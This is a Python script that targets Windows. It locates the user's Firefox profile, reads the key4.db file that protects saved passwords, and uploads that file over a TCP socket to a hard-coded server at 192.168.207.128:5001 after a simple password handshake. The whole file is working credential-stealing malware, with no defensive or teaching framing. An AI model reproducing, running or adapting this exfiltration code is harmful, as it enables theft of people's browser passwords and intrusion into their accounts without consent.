import socket
import os
import glob
if os.name != "nt":
    exit()

# Configuration

LOCAL = os.getenv("APPDATA")
SERVER_HOST = '192.168.207.128'
SERVER_PORT = 5001
BUFFER_SIZE = 4096
PASSWORD = "yourpassword"

def find_firefox_profile_and_keys():
    # Locate the Firefox profiles directory on Windows
    appdata = os.getenv('APPDATA')
    profiles_path = os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
    
    # Check if the profiles directory exists
    if not os.path.exists(profiles_path):
        return None, None
    
    # Find all profiles in the profiles directory
    profiles = glob.glob(os.path.join(profiles_path, '*.default-release'))
    
    if not profiles:
        profiles = glob.glob(os.path.join(profiles_path, '*.default'))
    
    if not profiles:
        return None, None
    
    # Use the first profile found (you can modify this if you need a specific profile)
    profile_path = profiles[0]
    
    # Locate the key4.db file in the profile directory
    key4_db_path = os.path.join(profile_path, 'key4.db')
    
    if not os.path.exists(key4_db_path):
        return profile_path, None
    
    return profile_path, key4_db_path

profile, key4_db = find_firefox_profile_and_keys()
FILE_PATH = key4_db


def send_file(client_socket):
    with open(FILE_PATH, "rb") as f:
        while True:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
            client_socket.sendall(bytes_read)
    print("File sent successfully.")

def main():
    client_socket = socket.socket()
    client_socket.connect((SERVER_HOST, SERVER_PORT))

    auth_prompt = client_socket.recv(BUFFER_SIZE).decode()
    if auth_prompt == "AUTH":
        client_socket.send(PASSWORD.encode())
        auth_response = client_socket.recv(BUFFER_SIZE).decode()

        if auth_response == "AUTH_SUCCESS":
            print("Authenticated successfully.")
            send_file(client_socket)
        else:
            print("Authentication failed.")
    else:
        print("Unexpected response from server.")

    client_socket.close()

if __name__ == "__main__":
    main()
